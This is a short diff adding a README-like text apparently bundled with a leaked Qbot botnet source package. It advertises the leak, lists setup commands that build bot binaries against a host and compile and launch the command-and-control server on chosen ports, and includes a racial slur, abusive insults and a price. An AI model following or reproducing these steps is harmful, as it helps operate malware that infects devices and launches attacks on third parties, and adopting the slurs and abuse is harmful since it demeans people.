@@ -1,0 +1,10 @@
+Leak by @w3bbex this is a real version and not a skidded one.
+Ez setup process it's a qbot nigga.
+
+python binz.py newbot.c [host]
+ulimit -n 999999
+gcc cnc.c -o c -pthread
+screen ./c 666 420 9999
+
+Fuck scammer retards and die in a hole you sack of shit.
+[150 bucks]
